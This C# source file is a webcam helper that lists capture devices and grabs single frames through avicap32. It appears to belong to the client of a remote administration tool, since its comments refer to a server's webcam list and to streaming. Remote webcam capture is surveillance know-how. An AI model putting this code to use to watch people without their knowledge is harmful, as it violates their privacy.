using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace xClient.Core.Helper
{
    class WebcamHelper
    {
        [DllImport("avicap32.dll")]
        protected static extern bool capGetDriverDescriptionA(short wDriverIndex, [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer);
        static ArrayList devices = new ArrayList();
        public static ArrayList GetAllDevices()
        {
            String dName = "".PadRight(100);
            String dVersion = "".PadRight(100);
            for (short i = 0; i < 10; i++)
            {
                if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100))
                {
                    devices.Add(dName.Trim()); ///// device name here, TODO: add to server's webcam list
                }
            }
            return devices;
        }

        [DllImport("user32", EntryPoint = "SendMessage")]
        public static extern int SendMessage(int hWnd, uint Msg, int wParam, string lParam);
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        public static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        public static int mCapHwnd = 0;   //Handle
        public static string tempBmp = Path.Combine(Path.GetTempPath(), FileHelper.GetRandomFilename(8));
        public static Bitmap TakePicture(int Webcam)
        {
            System.Windows.Forms.PictureBox PictureBox = new System.Windows.Forms.PictureBox();
            mCapHwnd = capCreateCaptureWindowA("", 0x10000000 | 0x40000000, 0, 0, 350, 350, PictureBox.Handle.ToInt32(), 0);
            SendMessage(mCapHwnd, 1034, Webcam, 0.ToString()); ///WM_CAP_CONNECT
            SendMessage(mCapHwnd, 1084, 0, 0.ToString()); ///WM_CAP_GET_FRAME
            SendMessage(mCapHwnd, 1049, 0, tempBmp); ///WM_CAP_FILE_SAVEDIB
            Bitmap bitmap = new Bitmap(tempBmp);
            return bitmap;
        }

        public void Disconnect() /// call this when server stop streaming
        {
            SendMessage(mCapHwnd, 1035, mCapHwnd, 0.ToString()); ///WM_CAP_CONNECT
            File.Delete(tempBmp);
        }
    }

}